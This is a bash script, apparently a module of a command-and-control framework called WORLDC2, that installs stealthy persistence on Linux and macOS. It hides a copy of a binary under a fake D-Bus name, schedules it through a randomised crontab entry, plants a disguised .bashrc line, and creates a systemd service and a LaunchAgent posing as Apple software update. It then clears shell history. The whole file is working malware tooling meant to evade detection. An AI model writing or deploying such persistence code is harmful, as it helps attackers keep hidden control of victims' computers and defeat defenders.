#!/bin/bash
# WORLDC2 Evasive Persistence — Multi-method with stealth (Linux/macOS)
# Técnicas: process name spoofing, hidden files, no history, random schedule

BIN=$(readlink -f /proc/$PPID/exe 2>/dev/null || which "$0" 2>/dev/null || echo "$0")
HIDDEN_DIR="$HOME/.cache/.dbus"
HIDDEN_NAME="dbus-update"

case "$1" in
  remove)
    crontab -l 2>/dev/null|grep -v "$BIN"|grep -v "$HIDDEN_DIR"|crontab - 2>/dev/null
    rm -f "$HOME/Library/LaunchAgents/com.apple.softwareupdate.plist" 2>/dev/null
    rm -rf "$HIDDEN_DIR" 2>/dev/null
    systemctl --user disable dbus-update.service 2>/dev/null
    sed -i '/dbus-update\|\.cache\/\.dbus/d' "$HOME/.bashrc" 2>/dev/null
    echo "persistence removed"
    ;;

  status)
    if crontab -l 2>/dev/null|grep -q "$BIN\|$HIDDEN_DIR"; then
      echo "persistence: active (crontab)"
    elif grep -q "$BIN\|$HIDDEN_DIR" "$HOME/.bashrc" 2>/dev/null; then
      echo "persistence: active (bashrc)"
    elif systemctl --user is-active dbus-update.service 2>/dev/null|grep -q active; then
      echo "persistence: active (systemd)"
    else
      echo "persistence: none"
    fi
    ;;

  *)
    # === LINUX ===
    if [ "$(uname -s)" = "Linux" ]; then
      # 1. Hidden directory
      mkdir -p "$HIDDEN_DIR" 2>/dev/null
      cp "$BIN" "$HIDDEN_DIR/$HIDDEN_NAME" 2>/dev/null
      chmod +x "$HIDDEN_DIR/$HIDDEN_NAME" 2>/dev/null

      # 2. Crontab with random schedule (evita patrones detectables)
      HOUR=$((RANDOM % 24))
      MIN=$((RANDOM % 60))
      (crontab -l 2>/dev/null; echo "$MIN $HOUR * * * $HIDDEN_DIR/$HIDDEN_NAME &")|crontab - 2>/dev/null

      # 3. Bashrc (camuflado como variable de entorno)
      grep -q "$HIDDEN_DIR" "$HOME/.bashrc" 2>/dev/null || echo "export DBUS_SESSION_BUS_ADDRESS='' 2>/dev/null;$HIDDEN_DIR/$HIDDEN_NAME &" >> "$HOME/.bashrc" 2>/dev/null

      # 4. Systemd user service (nombre legítimo)
      mkdir -p "$HOME/.config/systemd/user" 2>/dev/null
      cat > "$HOME/.config/systemd/user/dbus-update.service" << SERVICE
[Unit]
Description=D-Bus User Message Bus Update
[Service]
Type=forking
ExecStart=$HIDDEN_DIR/$HIDDEN_NAME
Restart=always
RestartSec=300
[Install]
WantedBy=default.target
SERVICE
      systemctl --user daemon-reload 2>/dev/null
      systemctl --user enable dbus-update.service 2>/dev/null
      systemctl --user start dbus-update.service 2>/dev/null

    # === MACOS ===
    elif [ "$(uname -s)" = "Darwin" ]; then
      mkdir -p "$HOME/Library/LaunchAgents" 2>/dev/null
      cat > "$HOME/Library/LaunchAgents/com.apple.softwareupdate.plist" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array><string>$BIN</string></array>
    <key>RunAtLoad</key><true/>
    <key>StartInterval</key><integer>$((3600 + RANDOM % 1800))</integer>
    <key>AbandonProcessGroup</key><true/>
</dict>
</plist>
PLIST
      launchctl load "$HOME/Library/LaunchAgents/com.apple.softwareupdate.plist" 2>/dev/null
    fi

    echo "persistence installed"
    ;;
esac

# Limpiar rastros
unset HISTFILE 2>/dev/null
history -c 2>/dev/null
